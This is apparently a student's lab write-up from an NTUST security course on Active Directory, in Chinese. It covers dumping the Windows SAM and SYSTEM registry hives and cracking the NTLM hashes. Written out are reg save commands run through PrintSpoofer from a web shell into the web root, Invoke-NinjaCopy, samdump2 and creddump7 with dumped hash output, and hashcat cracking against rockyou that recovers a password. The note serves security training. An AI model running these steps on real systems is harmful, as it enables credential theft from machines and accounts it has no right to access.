---
title: NTUSTISC - AD Note - Lab(Brute Force SAM)
tags: [NTUSTISC, AD, information security]

category: "Security Course｜NTUST ISC｜AD｜3. 更多密碼"
date: 2024-01-31
---

# NTUSTISC - AD Note - Lab(Brute Force SAM)
<!-- more -->
[TOC]

Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&t=4257)

## Background
得到更高權限之後，會想要更多的密碼
* 密碼收集
    * SAM.hive(Security Account Manager)
        * What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證
        * Where: `C:\Windows\System32\config\SAM`
    * Password Spraying(用猜的)
    * GPO
    * 記憶體(lsass)

## Lab

### ==Brute Force SAM==
前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取
![](https://hackmd.io/_uploads/SyEUVnMRn.png)

1. 匯出SAM File
主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取
    ```bash!
    $ reg save HKLM\SAM <save filename>
    $ reg save HKLM\SYSTEM <save filename>
    ```
    * 錯誤的方式
        但經過cmd用普通權限實測會發現我們沒有這樣的資格
        ```bash!
        $ reg save HKLM\SAM SAM.dump
        錯誤: 用戶端沒有這項特殊權限。
        ```
        其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file
    * 正確的方式-1
        用前面提到的web shell，打出以下指令，則SAM file就會dump到`C:\inetpub\wwwroot\sam.zip`
        ```bash!
        $ c:\tools\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam"
        ```
    * 正確的方式-2
        利用[Invoke-NinjaCopy.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1)這個腳本，就可以複製出來，原理是使用windows的影子複製
        ```bash!
        $ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY
        ```
        但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤?
        :::info
        如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊[^ps-error-solution]解決問題
        ```bash
        .\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\tools\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。
        位於 線路:1 字元:1
        + .\Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestina ...
        + ~~~~~~~~~~~~~~~~~~
            + CategoryInfo          : SecurityError: (:) [], PSSecurityException
            + FullyQualifiedErrorId : UnauthorizedAccess
        ```
        :::
2. 解析SAM內容
    拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析
    * Win10 v1607之前的解法
        ```bash
        $ samdump2 system sam 
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        *disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        :1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        ```
        ![](https://hackmd.io/_uploads/HyJXHazCn.png)
        可以看到很多都是disabled，就代表我們要用下面的解法
    * Win10 v1607之後
    因為這個版本之後有用到AES加密，所以可以用[Creddump7](https://github.com/CiscoCXSecurity/creddump7)，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事，
        ```bash
        $ conda activate py2.7
        $ pip install pycrypto
        $ git clone https://github.com/CiscoCXSecurity/creddump7.git
        $ python pwdump.py system sam
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819:::
        user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        ```
3. 解析Hash
    * 方法一：用online database
        接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如[cmd5](https://www.cmd5.com/)，如果把最前面找到的`31d6cfe0d16ae931b73c59d7e0c089c0`會顯示空密碼，但我們都知道是錯的
        ![](https://hackmd.io/_uploads/SkKrp6zCn.png)
        而如果拿Creddump解析出來的`7ecffff0c3548187607a14bad0f88bb1`，就可以直接顯示出我們的密碼
        ![](https://hackmd.io/_uploads/H1ZAhpz02.png)
    * 方法二：爆字典檔
        在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看
        ```bash
        $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
        $ cp /usr/share/wordlists/rockyou.txt ./
        $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force
        ...
        31d6cfe0d16ae931b73c59d7e0c089c0:                         
        7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc
        ...
        ```

# Reference
[^ps-error-solution]:[PowerShell 「系統上已停用指令碼執行」解決方法](https://hackercat.org/windows/powershell-cannot-be-loaded-because-the-execution-of-scripts-is-disabled-on-this-system)